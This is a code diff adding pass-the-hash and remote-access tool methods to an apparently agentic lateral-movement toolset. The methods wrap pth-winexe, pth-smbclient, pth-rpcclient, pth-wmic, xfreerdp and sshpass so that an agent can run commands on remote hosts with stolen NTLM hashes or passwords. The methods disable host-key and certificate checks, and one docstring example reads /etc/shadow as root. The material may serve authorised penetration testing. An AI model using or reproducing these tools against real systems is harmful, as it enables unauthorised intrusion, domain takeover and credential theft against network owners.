@@ -774,6 +774,316 @@ class LateralMovementTools(Toolset):
                     f"Enables pass-the-hash, golden ticket, and complete domain takeover."
                 )
 
+    # ===================
+    # Pass-the-Hash Tools
+    # ===================
+
+    @dn.tool_method
+    def pth_winexe(
+        self,
+        target: str,
+        username: str,
+        hash: str,
+        domain: str | None = None,
+        command: str = "cmd.exe /c whoami && hostname",
+    ) -> str:
+        """
+        Execute command via pass-the-hash using pth-winexe.
+
+        Alternative to impacket psexec/wmiexec when they fail.
+        Uses the passing-the-hash toolkit.
+
+        Args:
+            target: Target machine IP or hostname
+            username: Username for authentication
+            hash: NTLM hash (LM:NT or just NT)
+            domain: Domain for authentication (optional)
+            command: Command to execute
+
+        Returns:
+            Command output from target
+
+        Example:
+            >>> pth_winexe("192.168.58.22", "Administrator", "aad3b435...:31d6cfe0...", "contoso.local")
+        """
+        user_spec = f"{domain}/{username}" if domain else username
+        cmd = [
+            "pth-winexe",
+            f"--user={user_spec}",
+            f"--hash={hash}",
+            f"//{target}",
+            command,
+        ]
+
+        try:
+            logger.info(f"[*] Executing via pth-winexe on {target}")
+            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=120)
+
+            result = stdout + "\n" + (stderr or "")
+
+            if returncode == 0 or username.lower() in result.lower():
+                logger.info(f"[+] pth-winexe to {target} successful!")
+
+            return result
+
+        except Exception as e:
+            return f"pth-winexe failed: {e}"
+
+    @dn.tool_method
+    def pth_smbclient(
+        self,
+        target: str,
+        username: str,
+        hash: str,
+        domain: str | None = None,
+        share: str = "C$",
+        command: str = "dir",
+    ) -> str:
+        """
+        Access SMB shares via pass-the-hash using pth-smbclient.
+
+        Useful for file operations when impacket smbclient is unavailable.
+
+        Args:
+            target: Target machine IP or hostname
+            username: Username for authentication
+            hash: NTLM hash (LM:NT or just NT)
+            domain: Domain for authentication (optional)
+            share: SMB share to access (default: C$)
+            command: smbclient command to run (default: dir)
+
+        Returns:
+            smbclient output
+
+        Example:
+            >>> pth_smbclient("192.168.58.22", "Administrator", "aad3b435...:31d6cfe0...", share="SYSVOL")
+        """
+        user_spec = f"{domain}/{username}" if domain else username
+        cmd = [
+            "pth-smbclient",
+            f"--user={user_spec}",
+            f"--hash={hash}",
+            f"//{target}/{share}",
+            "-c",
+            command,
+        ]
+
+        try:
+            logger.info(f"[*] Accessing {target}/{share} via pth-smbclient")
+            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)
+            return stdout + "\n" + (stderr or "")
+
+        except Exception as e:
+            return f"pth-smbclient failed: {e}"
+
+    @dn.tool_method
+    def pth_rpcclient(
+        self,
+        target: str,
+        username: str,
+        hash: str,
+        domain: str | None = None,
+        command: str = "enumdomusers",
+    ) -> str:
+        """
+        Execute RPC commands via pass-the-hash using pth-rpcclient.
+
+        Useful for enumeration and recon with hash-based auth.
+
+        Args:
+            target: Target machine IP or hostname
+            username: Username for authentication
+            hash: NTLM hash (LM:NT or just NT)
+            domain: Domain for authentication (optional)
+            command: RPC command to run (default: enumdomusers)
+
+        Returns:
+            rpcclient output
+
+        Example:
+            >>> pth_rpcclient("192.168.58.10", "Administrator", "aad3b435...:31d6cfe0...", command="enumdomgroups")
+        """
+        user_spec = f"{domain}/{username}%{hash}" if domain else f"{username}%{hash}"
+        cmd = ["pth-rpcclient", "-U", user_spec, target, "-c", command]
+
+        try:
+            logger.info(f"[*] Running rpcclient on {target} via PTH")
+            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)
+            return stdout + "\n" + (stderr or "")
+
+        except Exception as e:
+            return f"pth-rpcclient failed: {e}"
+
+    @dn.tool_method
+    def pth_wmic(
+        self,
+        target: str,
+        username: str,
+        hash: str,
+        domain: str | None = None,
+        query: str = "SELECT * FROM Win32_OperatingSystem",
+    ) -> str:
+        """
+        Execute WMI queries via pass-the-hash using pth-wmic.
+
+        Useful for remote enumeration when impacket wmiexec is unavailable.
+
+        Args:
+            target: Target machine IP or hostname
+            username: Username for authentication
+            hash: NTLM hash (LM:NT or just NT)
+            domain: Domain for authentication (optional)
+            query: WMI query to execute
+
+        Returns:
+            WMI query results
+
+        Example:
+            >>> pth_wmic("192.168.58.22", "Administrator", "aad3b435...:31d6cfe0...", query="SELECT * FROM Win32_Process")
+        """
+        user_spec = f"{domain}/{username}%{hash}" if domain else f"{username}%{hash}"
+        cmd = [
+            "pth-wmic",
+            "-U",
+            user_spec,
+            f"//{target}",
+            query,
+        ]
+
+        try:
+            logger.info(f"[*] Running WMI query on {target} via PTH")
+            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)
+            return stdout + "\n" + (stderr or "")
+
+        except Exception as e:
+            return f"pth-wmic failed: {e}"
+
+    # ===================
+    # RDP and SSH Tools
+    # ===================
+
+    @dn.tool_method
+    def xfreerdp(
+        self,
+        target: str,
+        username: str,
+        password: str | None = None,
+        hash: str | None = None,
+        domain: str | None = None,
+        command: str | None = None,
+    ) -> str:
+        """
+        RDP connection with pass-the-hash support via xfreerdp.
+
+        Use for RDP access when WinRM/SMB exec are blocked.
+        With hash: uses Restricted Admin mode (must be enabled on target).
+
+        Args:
+            target: Target machine IP or hostname
+            username: Username for authentication
+            password: Password (optional if using hash)
+            hash: NTLM hash for Restricted Admin PTH (optional)
+            domain: Domain for authentication (optional)
+            command: Command to run (if None, verifies connection only)
+
+        Returns:
+            RDP connection result
+
+        Example:
+            >>> xfreerdp("192.168.58.22", "Administrator", password="pass")  # pragma: allowlist secret
+            >>> xfreerdp("192.168.58.22", "Administrator", hash="31d6cfe0...")
+        """
+        if not (password or hash):
+            return "[!] Error: Either password or hash required"
+
+        cmd = ["xfreerdp", f"/v:{target}", f"/u:{username}", "/cert:ignore"]
+
+        if domain:
+            cmd.append(f"/d:{domain}")
+
+        if hash:
+            # Restricted Admin mode with PTH
+            cmd.extend([f"/pth:{hash}", "/restricted-admin"])
+        else:
+            cmd.append(f"/p:{password}")
+
+        if command:
+            # Non-interactive: run command and exit
+            cmd.extend(["/app:cmd.exe", f"/app-cmd:/c {command}", "/timeout:30000"])
+        else:
+            # Interactive session check (just verify connection)
+            cmd.extend(["/app:cmd.exe", "/app-cmd:/c whoami", "/timeout:10000"])
+
+        try:
+            logger.info(f"[*] Connecting to {target} via RDP")
+            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=60)
+
+            result = stdout + "\n" + (stderr or "")
+
+            if returncode == 0:
+                result = f"[+] RDP connection to {target} successful!\n" + result
+
+            return result
+
+        except Exception as e:
+            return f"xfreerdp failed: {e}"
+
+    @dn.tool_method
+    def ssh_with_password(
+        self,
+        target: str,
+        username: str,
+        password: str,
+        command: str = "id && hostname",
+        port: int = 22,
+    ) -> str:
+        """
+        SSH with password authentication using sshpass.
+
+        Use for Linux/Unix lateral movement when SSH keys are unavailable.
+
+        Args:
+            target: Target machine IP or hostname
+            username: Username for SSH authentication
+            password: Password for authentication
+            command: Command to execute on remote host
+            port: SSH port (default: 22)
+
+        Returns:
+            Command output from remote host
+
+        Example:
+            >>> ssh_with_password("192.168.58.50", "root", "toor", "cat /etc/shadow")  # pragma: allowlist secret
+        """
+        cmd = [
+            "sshpass",
+            "-p",
+            password,
+            "ssh",
+            "-o",
+            "StrictHostKeyChecking=no",
+            "-o",
+            "UserKnownHostsFile=/dev/null",
+            "-p",
+            str(port),
+            f"{username}@{target}",
+            command,
+        ]
+
+        try:
+            logger.info(f"[*] Connecting to {target} via SSH")
+            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=60)
+
+            result = stdout + "\n" + (stderr or "")
+
+            if returncode == 0:
+                result = f"[+] SSH to {target} successful!\n" + result
+
+            return result
+
+        except Exception as e:
+            return f"SSH with password failed: {e}"
+
 
 class MSSQLTools(Toolset):
     """Tools for MSSQL exploitation and privilege escalation.
